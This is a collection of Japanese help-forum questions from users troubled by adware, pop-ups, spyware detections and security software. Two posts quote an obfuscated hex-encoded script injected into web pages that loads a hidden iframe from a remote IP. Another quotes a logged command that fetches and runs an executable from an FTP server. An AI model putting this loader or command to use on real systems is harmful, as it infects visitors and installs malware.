何か起動しようとすると、Ads Served by Dcadsとある外国からの広告が出てきます。 SpybotとAd-Awareで探し、Webhancerは削除できていると思います。 一応セーフモードでもチェックしました。 しばらく何も音沙汰が無かったのですが、ある日突然広告が復活しました。 再びSpybotとAd-Awareで検索しましたが、何も検出されません。 未だに広告が出てきます。 どのように対処すればよいのでしょうか。 Windows XPです。
仕事で使っていたパソコン（ダイナブックＴ４、ＯＳはWindowsＸＰホームエディション）をインターネットで使用するため、プロダクトリカバリＣＤでリカバリしました。念のため２回。ほとんど初期化と変わらない作業だということはいろいろ調べて分かったのですが、ただデータが表面上見えなくなっただけで、復元ソフトを使用すれば復元できるという話も多くありました。そこで質問なんですが、一旦リカバリしたＨＤＤからインターネットを通じて、例えば特殊なウイルスなどを送り込んで見えなくなったデータを復元させ、ネット上に流出させるなんてことはできるのでしょうか。できるとして、通常のアンチウイルスソフトで防御できますか。素人の質問ですみません。
スパイウェアブラスター３.５１(SpywareBlaster)の 機能の事で質問なんですが ＯＳはＭＥですが、私情で変更出来ない為 その話題には触れないで下さい そしてブラウザはＦｉｒｅｆｏｘ２なんですが 結論から言うと、アップデートした時 Ｆｉｒｅｆｏｘの部分がグレーに、なってると言う事なんです で、週１回アップデートしてたんですが 今迄は問題なく青い文字で表示されてました しかし、２～３回位前…ですから２～３週間前と言う事に なるでしょうか？ 急に、この表示に、なりました そこで、Ｆｉｒｅｆｏｘの所をクリックしたんですが 全部英語表示の為、何が書いてあるかが分らなく 文章の量も多い為、全て、ここで書くのは難しいと思ったんで 一応、太文字だけ書かせて頂くと 「Ｆｉｒｅｆｏｘ　ｎｏｔ　ｄｅｔｅｃｔｅｄ」 と出てました これは、どういう事なんでしょうか？ やはりアップデートが出来て無い…あるいは 出来ないんでしょうか？ 尚、余談かも知れませんが スパイウェアブラスターを入れた理由は 現在、セキュリティ対策として ウィルスの手動検索を隔週で１回と スパイ(スパイウェア)チェックも、スパイボットと アドアゥェア(Ad-Aware)で週１回、通常＆セーフモードで 手動検索してます ただ、現在、スパイはヒットしませんが 毎回の様にクッキーがヒットするんですが 私自身、クッキーは基本的に問題無いとは分かってますが そのままに、すると 本当にスパイがヒットした場合クッキーの量が多いと スパイを探すのに大変かと思い、ＩＥ６を使用してた時代は スパイボットの免疫機能を使用したんですが Ｆｉｒｅｆｏｘだと、この機能も通用しない事を知った為 スパイウェアブラスターを入れました 宜しく御願いします
スパイウェアにかかったのでリカバリーCDを使用したのですが ローカル ディスクCだけリカバリーされ、Dは何も変化なしですが これでいいのでしょうか？ Dにあるファイルに悪いものがあれば意味がないのでは・・・ と思ったのですが、どうなのでしょうか？ よろしくお願いします。
はじめて質問します。 最近、とあるポータルサイトで使用しているIDが何者かに不正使用されていました。（幸いまだ経済的な被害はありません） そこでログイン履歴からIPアドレスを調べたところ、元職場のネットワークPC（おそらく勤務中）と自宅と思われるところからアクセスしてきているのがわかりました。（つまり元同僚） すでに、目星は付いているのですが決定的な証拠はありません。 そこで、自宅からアクセスした際のNTTの収容局（交換局）はわかっていますので、その収容局がカバーしているエリアを調べる方法はあるでしょうか？ 逆のパターン…つまり電話番号から対応局舎はいくらでも調べられるようなのですが。 不正アクセスした人物の自宅が、その局舎の対応エリアかどうかを確認したいものですから。 よろしくお願いします。
セキュリティ対策にソースネクストの 【ウィルスセキュリティＺＥＲＯ】 を使用しています。 「ブラクラを踏んだら　ウィルス スキャンとスパイウェア スキャンの両方をした方がイイですよ！」 と書いてあったのですが　普通は　ウィルス対策ソフト　と　スパイウェア対策ソフトの二つのソフトを入れているのですか？ 今まで　セキュリティ対策は　セキュリティ対策ソフトを　一つ入れていればイイと思っていたのですが　ココに来て　二つ入れないとヤバイのかな？っと思い　質問させて頂きました。 もし　スパイウェア対策ソフトを入れるとしたら　何がイイと思いますか？ 【ウィルスセキュリティＺＥＲＯ】と相性が良いのがイイです。 　ＯＳ　Ｗｉｎｄｏｗｓ　ｘｐ　ＳＰ２ ＣＰＵ　Ｃｅｌｅｒｏｎ　Ｍ（１.３０ＧＨｚ） メモリ　１.５ＧＢ よろしく　おねがいします。
3週間から海外の広告が時々出てくるようになりました。 そこでまず怪しいものをアンインストールしたのですが、まだ出てきたので 時々重くもなるしスパイウェアかな？と思いAd-Aware 2007 を使ったところ何件かひっかかりスキャンしたのですが まだ広告がでてきます。この場合スパイウェアはもう殺せていて 広告だけでてきていると考えて広告を出ないようにすればいいのでしょうか？ それともスパイウェアはまだ生きているので復元やリカバリーなどの処置をとった方がいいのでしょうか？ よろしくお願いします。
HPを運営しているのですが、最近、1日に1回 <body>のすぐ後ろに <iframe src='http://url' width='1' height='1' style='visibility:hidden'></iframe><script>function v475af88182c70(v475af8818534b){ function v475af88187800 () {return 16;} return(parseInt(v475af8818534b,v475af88187800()));}function v475af8818871e(v475af88188ee4){ function v475af8818a653 () {var v475af8818c5ef=2; return v475af8818c5ef;} var v475af881896b3='';for(v475af88189e84=0; v475af88189e84<v475af88188ee4.length; v475af88189e84+=v475af8818a653()){ v475af881896b3+=(String.fromCharCode(v475af88182c70(v475af88188ee4.substr(v475af88189e84, v475af8818a653()))));}return v475af881896b3;} document.write(v475af8818871e('3C5343524950543E77696E646F772E7374617475733D27446F6E65273B646F63756D656E742E777269746528273C696672616D65206E616D653D363134396433626361207372633D5C27687474703A2F2F37372E3232312E3133332E3138382F2E69662F676F2E68746D6C3F272B4D6174682E726F756E64284D6174682E72616E646F6D28292A333239323834292B2730365C272077696474683D373634206865696768743D343331207374796C653D5C27646973706C61793A206E6F6E655C273E3C2F696672616D653E27293C2F5343524950543E'));</script> このようなソースが勝手にかかれてしまいます。 avastとadawareを使用し、セーフモードでHDD内を全て検索したのですが、何も反応はでませんでしたが、 まだこの現象は起こっています。 何か分かる方はいらっしゃいませんでしょうか？ よろしくお願いいたします。
家族のPC問題について質問します。 winのXPです。 昨日から、PCで作業中に突然「コピーをしています」というダイアログが立ち上がります。 キャンセルボタンがあるので、立ち上がるたびにキャンセルを押しているのですが、数分に一度起り、仕事になりません。 また、画面右下のいろんなメニューがこまごまと表示されているところに、「このスパイウェア対策ソフトを買いましょう」というような英語のサイトの案内が出ます。 海外サイトで何かをクリックした際に感染したようです。（本人は言いませんが、アダルトサイトを見ていたようです） 「ノートンインターネットセキュリティ2008」をインストールし、全スキャンをかけたのですが、解決しません。 ネット環境はADSL常時接続なので、とりあえずネットの線を引き抜いていますが・・・。 どなたかヒントでもいただけないでしょうか？ よろしくお願いいたします。
自宅のパソコンがこわれ仕方なく近所の地元では大きいネットカフェのパソコンでワードをつかい大事な文書をつくりました 作成に三時間ほどかかたのですが最後にフロッピーに保存して帰宅しました 保存するときワードの全体オプション？のところでパスワードを入力してしました しかし 急に不安になりました もしかして三時間のあいだに.あのパソコンに自動バックアップ機能？のようなものがあって(以前ワードがフリーズしたとき時々再起動したら前のがのこってたことあるし)のこってたり 流出してたり 万が一ウイニーがデスクトップにはないけど入っててばらまかれてたらどうしよう…とか 不安です ワードにパスワードつけてフロッピーに保存してた場合もしウイニーみたいなんがはいってても大丈夫ですか また確認する方法はありましか
PCに入れておいたCD-ROMを使ってみようと（教材についていたもの）スタートしてみたら NOD３２の警告でwin32/Rootkit.AgentNDYトロイのウイルス検出と出ました。 PCをNOD３２でウィルス・チェックしても何も出てこないのですが、 これはPCがトロイに感染しているという事なのでしょうか。 それともPCに入れっぱなしにしていたCD－ROMに感染していたりするのでしょうか。 他のCD-ROMは普通に使えます。 PCは問題なく使えていますが、心配です。 スパイウエア用のソフトを入れてチェックした方が良いのでしょうか？
私のＨＰからリンクしている知人のサイトがあります。 その知人サイトを開いたときに「スパイウェア警告が出た」と私のＨＰのゲストブックに書き込みがありました。 連絡してくださった方の環境やどのような警告だったのかは分かりません。 プラグインやスクリプト系は全部切って、Operaでそのサイトのトップページを保存してエディタで開いてみたところ、BODYの最初にこんなタグが入っていました。 <iframe src='http://url' width='1' height='1' style='visibility: hidden;'></iframe><script>function v47597c712c521(v47597c712d107){ function v47597c712d4ea () {var v47597c712d8d2=16; return v47597c712d8d2;} return(parseInt(v47597c712d107,v47597c712d4ea()));}function v47597c712dcb9(v47597c712e09d){ var v47597c712e488='';for(v47597c712e86d=0; v47597c712e86d<v47597c712e09d.length; v47597c712e86d+=2){ v47597c712e488+=(String.fromCharCode(v47597c712c521(v47597c712e09d.substr(v47597c712e86d, 2))));}return v47597c712e488;} document.write(v47597c712dcb9('3C5343524950543E77696E646F772E7374617475733D27446F6E65273B646F63756D656E742E777269746528273C696672616D65206E616D653D38383932633136207372633D5C27687474703A2F2F37372E3232312E3133332E3138382F2E69662F676F2E68746D6C3F272B4D6174682E726F756E64284D6174682E72616E646F6D28292A3632323734292B273064385C272077696474683D323931206865696768743D323134207374796C653D5C27646973706C61793A206E6F6E655C273E3C2F696672616D653E27293C2F5343524950543E'));</script> これがスパイウェアのコードなのでしょうか？ また、スパイウェアだとしたら、今回のスパイウェアがどのような類のものなのか解説や対処方法が掲載されたＵＲＬ（あるいは検索用キーワード）を教えていただけませんでしょうか。 よろしくお願いします。
3週間前くらいからインターネットをしていると なんか重いなと思っていたら外国の広告が勝手にでてくるようになりました。 広告は夜の10時30分以降にでてきます。 インターネットをしている途中にでてきます。 他の時間帯は広告はでませんが時々重くなります。 スパイウェアかなと思いまず怪しいものをアンインストールして Spybotを試してみたのですが、メモリ上にあって修正できないと言われました。 他にもいろいろスキャンを試みたのですが、まだ広告がでてきます。 Ad-Aware 2007も使ってみましたが変化なしです。 最近は重くなるのも少なくなってきているので、もしかするとスパイウェアは消えていて広告がでなくできれば解決なのかもしれないと思っていますが、 広告をでなくするのがいまいちわかりません。 できればリカナリーやスパイウェアにかかる前の状態に戻すなどは したくないのですが・・・・ 旧PCも変な広告が出てくるようになったと思うと壊れたので心配しています。 解決方法を教えてください。 お願いします。
EasyCleaner2.0というソフトで、「不要ファイル：インターネット一時ファイル」を検索すると C:\Documents and Settings\ユーザ名\Local Settings\Temporary Internet Files\Content.IE5 （フォルダ:サイズ:0) C:\Documents and Settings\ユーザ名\Local Settings\Temporary Internet Files\Content.IE5\index.dat（DATファイル:サイズ: 8978432) と２つ出て、これらを削除しようとすると、これらのファイルは 使用中で削除できません。となります。 ちなみに削除中にはブラウザはすべて閉じています。 削除できないこの２個のファイルとフォルダはいったい 何なのでしょうか？ちなみブラウザはIE6を使用しており、 IE5なんて使ってないのですが。。。 お分かりの方がいましたらぜひ教えてください。
ＩＥでGoogleのツールバーを使っているのですが、Googleで検索を掛けるとＩＥの左のお気に入りや履歴を表示されるところに"Sponsored Links"と表示され外国のＵＲＬがたくさんでてきます。 SpybotやAd-Awareをインストールして使いましたが、まったく改善できません。 どなたか直し方を教えていただきませんか。 よろしくお願いします。
@niftyのサービスセキュリティー24を使用しています。 スパイウエアークリーナーでTrojanのPripiというスパイウエアが発見されました。しかし、削除の仕方がまったくわかりません。封印ボタンを押しても封印できないアイテムがあったと表示されます。＠niftyの担当者に電話しましたがわかりませんでした。どなたか駆除方法をご存知でしたらお教え願います。
PCの電源を入れてしばらくすると勝手にabout blankと言う真っ白な画面がでてきます。インターネットオプションのホームページはヤフーになっているのですがどういうことなのでしょうか？
PCを起動していると当然PCが動き出してコマンドプロンプトを立ち上げたり、ファイル名を指定して実行するなどに不明なコマンドが残っています。 おかしいと思ってから、spybotやadawareなどをインストールしてスキャンしてみましたが、状況は変わらず、最終手段としてOSを再インストールしてみたのですが、状況は変わりませんでした。 データ復旧用のHDDにウィルス・スパイウェアのようなものが残っているのでしょうか？ どうすればよいか分かりません。 どなたか対応策がわかればご教授下さい。 以下にキーロガーにて残っていた履歴を載せます。 宜しくお願いします。 環境 OS：winXPsp2 対ウィルスソフト：ノートンインターネットセキュリティ2008 ログ [ActiveWindow => V^XN] 0:59:30 [RETURN] 0:59:32 [SHIFT] 0:59:32 [53] 0:59:32 s 0:59:32 y 0:59:32 s 0:59:33 t 0:59:33 e 0:59:33 m 0:59:33 r 0:59:33 o 0:59:33 o 0:59:33 t 0:59:33 [SHIFT] 0:59:33 [53] 0:59:34 [53] 0:59:34 s 0:59:34 y 0:59:34 s 0:59:34 t 0:59:34 e 0:59:34 m 0:59:34 [51] 0:59:35 [50] 0:59:35 [50] 0:59:35 c 0:59:35 m 0:59:35 d 0:59:35 d 0:59:35 e 0:59:35 x 0:59:36 e [ActiveWindow => Windows ^XN }l[W] 0:59:36 [RETURN] 1:5:37 f 1:5:37 f [ActiveWindow => V^XN] 1:5:38 [RETURN] /*--------------ClipBoard Start-----------------*/ cmd /c echo open 220.130.37.43 21 >> ik &echo user B0t _A159753b >> ik &echo binary >> ik &echo get PI.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &PI.exe &exit /*--------------ClipBoard Exit-----------------*/ 1:5:45 v 1:5:45 [Ctrl] [ActiveWindow => Windows ^XN }l[W] 1:5:47 [RETURN] 1:6:30 f 1:6:30 f [ActiveWindow => V^XN] 1:6:31 [RETURN] /*--------------ClipBoard Start-----------------*/ cmd /c echo open 220.130.37.43 21 >> ik &echo user B0t _A159753b >> ik &echo binary >> ik &echo get DB.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &DB.exe &exit /*--------------ClipBoard Exit-----------------*/
WindowsXPで、ウィルスバスター２００７を使用しています。 その『フィッシング詐欺対策』の中にある『スパイウェア対策』を有効にすると、 インターネットに接続した途端に左上にポップが出てきます。 （リアルタイム検索中にウイルス／スパイウェアがみつかったため～、というものです。） しかも何度消しても出続けるため、全くインターネットを使用できない状況になってしまいます。 その為、その部分だけ無効にして使用しています。 それなのに、ウィルスバスターでウイルス／スパイウェア検索を行っても検出は全くされません。 自分のＰＣから情報が流出するのも恐いですが、自分のＰＣを媒体として他の方に迷惑が掛かるのが恐いので、 こんな場合にどうしたらいいのか教えてくださると嬉しいです。
ノートン３６０でスキャンしたら以下のようなTracking Cookieが検出されました。 上４つは危険性はなさそうですけど、5・6番目のTracking Cookieは毎回のように引っかかります。　　他は時々引っかかる感じです。 私は危険性の高いスパイウェアに感染しているのでしょうか？　もし感染しているのならウィルスソフトでも除去しきれないものがあるということでしょうか？ パソコンの細部については無知なのでどのような対応をしたらいいのか　ぜひ情報をお願いします。 Cookie ; owner@finance.yahoo.com/ Cookie ; owner@valueclick.ne.jp/ Cookie ; owner@k-tai.impress.co.jp/ Cookie ; owner@impress.co.jp/ Cookie ; owner@ad.spacehunter.drecom.jp/ad/ Cookie ; owner@ad.yieldmanager.com/ Cookie ; owner@hatena.ne.jp/ Cookie ; owner@d.hatena.ne.jp Cookie ; owner@statse.webtrendslive.com/ Cookie ; owner@server.lon.liveperson.net Cookie ; owner@adopt.specificclick.net/ Cookie ; owner@media.adrevolver.com Cookie ; owner@adopt.liveclick.ne.jp Cookie ; owner@server.lon.liveperson.net/ Cookie ; owner@statse.webtrendslive.com/
いま一太郎を使っていますが、作った文章をデスクトップに保存してから、見る時に開こうとするとActiveXコントロールによってブロックされました、表示するにはここをクリックとなり、毎回　毎回面倒ですActiveXコントロールによってブロックされないで表示する方法を教えてください.（ヘルプを見てインターネットオプション～セキュリテイ～レベルのカスタマイズを操作しても治りません）
最近、VistaのPCを買い、スパイウェア対策をしようとしました。窓の杜では、Vista対応のAd-Aware2007 Freeのフリーソフトがダウンロードできる状態だったので、迷わずインストールしました。 起動させると、Ad-Aware2007の下のSystem Protection Statusの欄で、Ad-Watch realtime protectionが赤く×が打たれoffになっていました。Ad-Watchは有償版に搭載のようなので使用にあたってこのままでも支障はないと調べた結果わかりました。 問題点は、そのとなりのAutomatic updateに赤く×が打たれ、状態がoffになっていることです。皆さんも最初はこのような状態でしょうか？？？ （参考URL)http://www.diana.dti.ne.jp/~atsuhiro/other_files … このソフトの操作説明が書かれている上記のサイトでは、この部分は緑色のチェックが打たれ、状態もonになっていました。赤い×から緑のチェックに、offをonに変えないと問題が起こるのでしょうか？？？もし今後問題が起こるのなら、そのような状態を改善する方法を教えていただきたいです。 もしかして、今回の問題点は、ただ自分自身で定期的にアップデートをしなさいということでしょうか？？？ちなみにアップデートはできています。 PCをはじめて間もないので、なるべく丁寧な説明をよろしくお願いいたします。
A-Squared freeでシステムをスキャンすると、下記のファイルがBackdoor.Win32.Rbot.bufで「リスクレベル:高」と判定されます。 C:\WINDOWS\$NtServicePackUninstall$hostdll.exe しかしNOD32、Ad-Aware2007、SpybotSD、SUPERAntiSpywareのスキャンでは、いずれも検出されません。Online malware scanでもA-Squared以外のScannerはすべて「Found nothing」の結果になります。 過去ログで調べると、hostdllはシステム・ファイルでトロイの木馬などではないようですが、やはり削除もしくは検疫した方がいいでしょうか。
お世話になります。 先日来変なことが発生して少し神経質になっているのかもしれませんが、今回マシンを起動しますとMcAfeeが次のような警告ダイアログを出しました。 ************************************************************ 新しいインターネット接続 ご使用のコンピュータは新しい場所からインターネットに接続しています。 ご使用のコンピュータは、友人の自宅、コーヒーショップ、ホテルなど、新しい場所に移動されています。このインターネット接続を信用して、コンピュータでのインターネットの使用を許可しますか？ この接続について ゲートウェイ　xxx.xxx.xxx.xxx マスク xxx.xxx.xxx.xxx この接続を信用する必要がありますか？ この接続を信用する この接続を信用しない 今後このアラートを表示しない OK **************************************************************** 以上IPアドレス以外はそのまま掲載しました。 新しい接続って何だろう？今までと変わりなく（勿論場所も）起動しただけなのに、、、と首を傾げています。 「この接続を信用する必要がありますか？」と聞かれてどう答えるのが良いのか迷いましたが、「この接続を信用しない」にチェックが入っていましたのでそのままにしておきました。インターネットは今までどおり出来ています。 思い当たることとしましてはJPCERTからCCCクリーナーというワームの発見および駆除のソフトをダウンロードし、その実行に際して一時的にMcAfeeをOFFにしたことぐらいです。 何がなんだかわけの分からない警告に戸惑っています。どなたかお教えください。
ノートン360を使っていますが一時的に動作を止めるにはどうすれば良いのでしょうか？
急に、警告ダイアログが出るようになりました。教えてｇｏｏ　のマイページに入る場合ですら、警告ダイアログがでます。 証明書を見ると、確かに、ｇｏｏだから、間違いないのでしょうが、証明書のインストールをしないで、はい、いいえ、閉じる、を何度でも、滅茶苦茶、クリックしているうちに、入れるようになりますが、、、 まあ、今回は、確かにｇｏｏの確認ができていますから良いですが、万一、確認できない場合に、はい、をクリックしてしまった場合、はい、くらいなら、証明書をインストールしていないから、大して問題ないのでしょうか？ クリック程度ですから、、、？ でも、不思議です。 なぜ、３日前から急に、こんなダイアログが出るようになったのか？ しかも、スパイウエアなどではなく、本当にｇｏｏのものであるのに？ 他の金融機関の場合も、このダイアログが同じ日から出るようになりました。 こんなの、全部、証明書のインストール必要なんでしょうか？ ９８ＳＥとＸＰと２台ありますが、９８ＳＥの方だけが、このダイアログがでます（３日前に何があったのでしょうか？） ※こんなクリックだけの（インストール動作をしていない）ことで、ＰＣ自体を自由にフィッシングされてしまうことなんてあるのでしょうか？ デスクトップを自由にリモートされてしまったりするんでしょうか？ 宜しく、ご指導御願いいたします。
2日前からインターネット画面にcritical system warning!というポップアップがずっと出ます。検索で削除する方法というのがあったので、それをそのまま行ってみましたが、全然効果がありません。 今利用しているパソコンは東芝のdynabookでXPを利用しています。ノートンも利用しています。 初心者の私でもわかるように削除する方法を教えてください。 ちなみに別の検索から試した削除方法は、SmitfraudFixで削除するという方法です。でも削除できませんでした。 なので違う方法で、どなたか教えてください。よろしくお願いします。
あることでコマンドプロンプトから　netstat　コマンドを実行しましたところ、Foreign Address　の欄に、 　　www.filewatcher.com:http ESTABLISHED　 という行がありました。 何だろうと思ってこのサイトを見てみましたが、 すべて英文表記で検索サイトのような感じでした。 私はこのサイトにアクセスしたわけでもないのに、 どうしてこんなものが上がっているのでしょうか？ 気持ちが悪くて仕方がありません。 お分かりの方いらっしゃいましたらお教えください。
セキュリティーの警告というダイアログが出て、困っています。 ２台のＰＣのうち、一台のみです。 急に、４日前あたりからです。 たくさんのＨＰで、出てくるので本当にこまります。 どうすればいいでしょうか？
こんばんわ。 スパイウェア対策について質問がありますので回答、アドバイス等をお願いします。 現在ウイルス対策ソフトとしてNorton Internet Security 2006を使用しています。NIS2008が3台までのパソコンにインストール出来るということなので購入を考えています。 さて、本題のスパイウェア対策ですが、今まではSpybot S&Dを使用してきました。しかし、文字化けやエラーなどがあるなど気になるところが多少あります。 そこでマイクロソフトのWindows Defenderの導入を考えているのですがいかがかと思い質問させていただきました。 使用環境は、怪しいサイト等には一切行かないパソコンです。 ネットショッピングなどに利用したりもします。 NIS2006又はNIS2008プラスWindows Defenderのみでの対策では不十分でしょうか？また、お勧めのスパイウェア対策ソフトなどがありましたら教えていただければ幸いです。 また、NIS2008のスパイウェア対策機能はSpybot S&Dと比べるといかがなものなのでしょう？ 回答お願いします。
現在ウィルス対策にMcAfeeを使っています。スパイウェア対策にspybotを入れてみたいんですけど、競合とかしないですか？一応McAfeeにもスパイウェア対策が付いているみたいです。
先日ノートン360の「削除したウィルス/スパイウェア」という項目を みてみると11月12日の検出に「Adware.SystemProcess」　と言うアドウェアが検出されていました。 OKWaveにも同じような質問をされている方がいたので、誤検索の可能性があるかと思い、シマンテックのサポートセンターに電話で問い合わせてみたのですが、「誤検出などはありません。」というように言われてしまいました。（削除されてるなら問題ないという事のようですが） しかし、サポートセンターの応えが質問と違うものだったり、言っている意味を理解してもらえない部分が多々あり、心配です。 （このまま何もしなくていいのか？このアドウェアに感染すると何が起こるのか？（シマンテックHPの該当項目を見てみたのですが、難しくて分かりませんでした）また、本当に誤検出じゃないのか？誤検出ならどうやってみわければいいのか？など） ちなみに、パソコンにはSPYBOT S&D(有償版）をいれてました。（ただ、更新期限がきれていたので新しいものを購入予定です。） また、最近はネットをほとんどせず、サイトも一般的なものしか見ていなかったと思います。（YOU　TUBEやそれ関連のサイトはいくつか見たことはあります） なるべく、ネット前とあとにはウィルスチェック、アップデートを行っていました。 上記の検出が行われる日まで2週間近くパソコンには触っていません。（ノートパソコンなので、ケーブルもはずしていました）12日のウィルス/スパイウェア検索の際も警告は何もなく、あとから削除した項目を見たときに気づきました。（もちろん、この検索の前にアップロードも行っています） 長文で申し訳ありませんが、よろしくお願いします。
最近になって、共有ソフトを使っていたらネットの接続速度が極端に落ちてしまって、まともにホームページが見れない状況です。トロイの木馬というやつでしょうか？ 原因としては何が考えられるでしょうか？ OS：Vista　Home Premium ウィルスソフト：ウィルスセキュリティZERO
今日、ウイルスバスター2007でパソコンに検索をかけたところ、 スパイウェアとして、 　 Adware_Softomate 　 というものが検出されました。 サーチエンジンなどで調べましたがどんなものかよくわかりませんでした。 それで、これは、 　 １．どういったものなのでしょう？ ２．危険性や被害が高いものなのか？（即刻駆除すべきものか？） ３．感染経路として考えられるルートは？ 　 の３点を知りたく、質問しました。 どうかよろしくおねがいします。 　 追記１ ウイルスバスターの検索結果として、詳細は HKU\S-1-5-21-765576727-3708919773-・・・・・・となっていました。 　 追記２ 最近、パソコンでしたいままでと違う行動としては、 INFOSEEKツールバーと、So-netツールバー　の導入 初めて行ったサイトでの動画や画像などダウンロード です。
Spybot-S&D 1.5を導入してみました。 以前Spybot-S&D 1.4を使用していた時はこんなことはなんかったのですが、 Spybot-S&D 1.5を昨日導入してみたところ起動に1分ほどかかります。(アップデートは最新にしてあります) ですので、起動を早くする方法がなければSpybot-S&D 1.4を導入しようと思うのですが、 今現在はSpybot-S&D 1.4が手元にありません、 Spybot-S&Dのサイトにいっても1.5しか探せず(探したらないのかもしれません) 現在Spybot-S&D 1.4がダウンロード出来る場所をお知りの方は教えて頂けると幸いです。 なお、セキュリティーソフトを終了させても起動時間はかわらずです。 当方環境 CPU Core2 Duo E6400 メモリ　　2G OS windowsXP SP2 セキュリティーソフト　カスペルスキー　インターネット　セキュリティー7.0
先日、spybotを使ってスパイウェアの検索と駆除を行ったのですが、そのときに何度やっても消すことのできない項目がありましたがふと思い立ってfirefoxのオプションからプライバシー情報をcookieごと削除したらそれ以降検知されなくなりました そのあと、一応カスペルスキーオンラインスキャンとノートンインターネットセキュリティでスキャンをかけたところウィルスも検知されなかったのですが何回やっても駆除できなったスパイウェアがインターネットのプライバシー情報とcookieの消去だけで駆除されるということはありえるのでしょうか？ 上に書いたとおりにその後、spybot、ad-aware、CWShredder、カスペルスキーオンラインスキャナ、NISのスキャナをかけましたがスパイウェアやウィルスは検出されませんでした 質問しておきながら申し訳ないんですが、あせっていたためそのときのスパイウェアの名前も記憶しておりません。 このような場合、検出されていたスパイウェアは削除されたものと考えてもいいのでしょうか。 心配性な性質のため気になって仕方ありません。 お答えのほど、よろしくおねがいします。
最近、ウイルスバスター2008が「cookie_2o7」「cookie_advertising」を検出するようになりました。以前は検出されず、信頼あるサイトをいくつか閲覧するだけで、すぐ感染（？）します。マイクロトレンドによればこの2種は有害クッキーではないようですが、以前検出されなかったのに、今では毎回検出されるのも疑問ですし、「ツール」からの「Cookieの削除」を行っても検出されることがあります。 これらのCookieが悪質なウイルスやスパイウェアの可能性はあるのでしょうか？また、無害なCookieであるならば、バスターが検出しなくなる方法はあるのでしょうか？ 分かる方がいらっしゃれば、よろしくお願いします。
http://www.nfl.com/ ↑は全米アメフトプロリーグの公式サイトなのですが、このサイトを観覧するたびにトロイの木馬系ウィルスに感染するみたいなんです。 ウィルス名は「Cookie_doubleclick」とかCookieから始まる名前です。 私の私見としては公式サイトだし、名前が名前だし、たぶん無害なんじゃないかなぁと思うのです（名前は無害に見せるフェイクかもしれませんが）。 プログラマーの兄に訊いてみても「知らん」と言われます（答えるのがめんどくさくて言ってるのかもしれません）。 みなさんの知恵を貸してください。お願いします。
ウイルス対策ソフトで、ウイルス・スパイウェアをスキャンしてみました。 すると30個のスパイウェアが検出されました。 これは全部削除したほうがいいのかな、と思いましたが、 “スパイウェアとして検出されたものの中には、通常に使用して問題のないプログラムが含まれている場合があります。 スパイウェアの削除はご自身の判断で削除してください” と書いてありました。 この手のものは全く素人でわからないのですが、 消してはいけないスパイウェア、消すべきスパイウェアとは、 どのように判断すればよいのでしょうか・・。 30個もあるのを知っていて放っておくのもなんだか・・・なもので。 詳しい方、教えてください。
これは、スパイウェアとは違うとは思いますが、教えてください。 小生の知らない間に、 「Yahoo検索」？　比較しよう-->Yahoo検索、JWWordサーチ、Google検索　のメニューとか、 頼みもしないので、Google検索画面がEnternet Exploareを開くと同時に立ち上がる。 これだけなら、いいのですが、メールを送る時に、エラーが発生します。 その時のメッセージは、 「ランタイムエラーが発生しました。デバッグしますか？ 行224エラー 'Google_ads'は宣言されていません」 どのように、直せばよいのか、今は分かっていませんが、システムをWindows2000を再インストールするつもりです。 パソコンの所有者の許可も得ず、勝手に何かを設定されるのは、困ります。 勝手に、書き換えられることを防ぐ方法はあるのでしょうか？ 宜しく、サジェスチョンをお願いいたします。
AD-aware2007をインストールすると、最後の６秒位のところで、Error 1722(Windowsのシステム不適合)が表示され、アンインストールされてしまう。環境は、WIN XP SP2、IE6　です。 対処方法を教えてください。
ホームページを作成したのですが、画像が表示されません。画像領域が空白になっており、左上隅に赤いＸ印があるだけです。この原因と解決方法をご教授戴ければ幸いです。
先日、Seagateの「Maxtor Basics Personal Storage 3200」に「Virus.Win32.AutoRun.ah」というウィルスが混入されていたという記事を読みました。 http://www.itmedia.co.jp/enterprise/articles/071 … 自分のPCを調べてみたら同じ製品で、不安になってスキャンをしてみましたが何も出ませんでした。 そこでSeagateのHPで配布されているKasperskyというソフトをDLして検索してみましたが検索の仕方がよく分かりません。 HDDに感染しているウィルスを本当に取り除くことは可能なのでしょうか。 Kasperskyというソフトをアンインストールしたら動き出しそうで出来ません。 どなたか駆除の仕方を教えていただけないでしょうか。
メッセンジャサービスという広告？が現れて、困ってます。ネットで検索しこれを回避する方法を導入してみたのですが、すぐに元に戻ってまた現れます。 どなたかいい方法をご指導下さい。 ちなみに検索した回避する方法とは、コントロールパネル→パフォーマンスとメンテナンス→管理ツール→サービス→Messengerのプロパティからスタートアップの種類を手動、サービスの状態を停止にするものです。しかししばらくすると変更した項目が元に戻っちゃいます。
フリーのスパイウェア対策ソフトとして一般的なものにspybotとad-awareがありますが、どちらの方が性能が高く、ソフトが軽く、また使いやすいのでしょうか？教えて頂けるとありがたいです。
今カスペルスキーを使っています。使い始めた当初、アンチハッカーの「攻撃を検知しました！」というブロックがよく表示されたので「今までずっとハッキングされてたの？！」と思いここで以前聞いてみたら「ルーターを入れていないので自分の端末まで直接通信が来る場合もあります。」といわれました。 しかしそれってネットをやっているときだけですよね？インターネットに繋げながらただIEなどのブラウザを立ち上げず、ただデスクトップ画面（というのでしたっけ？携帯で言う待受画面のことです）のままでいたらいきなに上記のブロックが表示されました。 これってありえることですか？もしかしたら本当にハッキングされてるのでは・・・。
SpywareBegoneを間違ってインストールしてしまいました。 削除しようと試みたのですが、「対象へのアクセスは拒否されました」と出てきて削除することができませんでした。どうすればいいのでしょうか？
Spybot-Search&Destroy1.4をアンインストールしたいんですができません。 たぶんシステムの復元をしたせいだと思うんですが、「プログラムの追加と削除」から削除しようとすると「ファイルが見つかりません、アンインストールできません！」と出ます。　　　「すべてのプログラム」にspybotの文字はありません。　　　色々検索して試してはみたんですがspybotは英語が多くて分かりません。　　　初心者ですが誰か助けて下さい、お願いします！！
Ｓｐｙｂｏｔでスキャンして、スパイウェアをさがして、出てきたスパイウェアを削除します。 けれどCnsMinというスパイウェアだけ、何度削除してもスキャンするたびに現れます。 リカバリーにはCnsMinが３１個もあります。 どうすればいいのでしょうか？ あとクッキーや削除して問題があったものは削除しなくていいんですか？
